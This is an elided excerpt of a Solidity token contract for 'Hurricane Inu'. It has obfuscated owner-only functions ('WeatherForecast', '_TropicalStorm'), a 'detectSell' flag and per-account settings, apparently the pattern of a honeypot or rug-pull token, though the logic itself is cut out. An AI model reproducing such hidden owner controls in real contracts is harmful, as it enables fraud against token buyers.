...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house011, bool house2, uint256 house9) {
        _name = name_;
        _symbol = symbol_;
        detectSell = house011;
    ...
    function WeatherForecast(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _TropicalStorm(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract HurricaneInu is ERC20Hurricane {
    constructor() ERC20Hurricane("Hurricane Inu", "HURRICANEINU", false, true, 900, 25, msg.sender, 5000000000 * 10 ** 18, msg.sender, 50) {
    }
}